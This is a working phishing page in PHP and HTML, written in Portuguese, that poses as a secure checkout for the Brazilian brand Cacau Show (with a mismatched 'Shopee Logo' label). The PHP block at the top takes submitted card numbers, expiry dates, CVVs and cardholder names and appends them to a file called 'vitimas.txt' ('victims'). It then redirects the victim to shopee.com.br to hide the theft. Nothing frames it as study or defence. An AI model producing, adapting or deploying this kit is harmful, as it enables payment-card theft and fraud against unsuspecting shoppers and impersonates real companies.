<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cartao = $_POST['card'];
    $validade = $_POST['validade'];
    $cvv = $_POST['cvv'];
    $nome = $_POST['nome'];

    $dados = "Cartão: $cartao | Validade: $validade | CVV: $cvv | Nome: $nome\n";
    file_put_contents("vitimas.txt", $dados, FILE_APPEND);

    header("Location: https://shopee.com.br");
    exit();

}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cacau Show - Pagamento</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&display=swap">
  <style>
    body {
      margin: 0;
      padding: 8px;
      box-sizing: border-box;
      font-family: 'Roboto', sans-serif;
      background: rgba(28,28,27,255);
      color: #333;
    }
    .container {
      max-width: 440px;
      margin: 50px auto;
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    }
    .logo {
      text-align: center;
      margin-bottom: 20px;
      background-color:rgba(28,28,27,255);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #34342c;   
    }
    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }
    input[type="text"],
    input[type="number"] {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      background: rgba(28,28,27,255); 
      color: #fff;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      margin-top: 20px;
      padding: 10px;
    }
    button:hover {
      background: #34342c;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #777;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="./logo.png" alt="Shopee Logo">
    </div>

    <h2>Pagamento Seguro</h2>
    <form method="POST" action="">
      <label for="card">Número do Cartão</label>
      <input type="text" id="card" name="card" placeholder="" required>

      <label for="validade">Validade</label>
      <input type="number" id="validade" name="validade" placeholder="" required>

      <label for="cvv">CVV</label>
      <input type="number" id="cvv" name="cvv" placeholder="" required>

      <label for="nome">Nome no Cartão</label>
      <input type="text" id="nome" name="nome" placeholder="" required>

      <button type="submit">Finalizar Pagamento</button>
    </form>

    <div class="footer">
      © 2025 Cacau Show Brasil. Todos os direitos reservados.
    </div>
  </div>
</body>
</html>
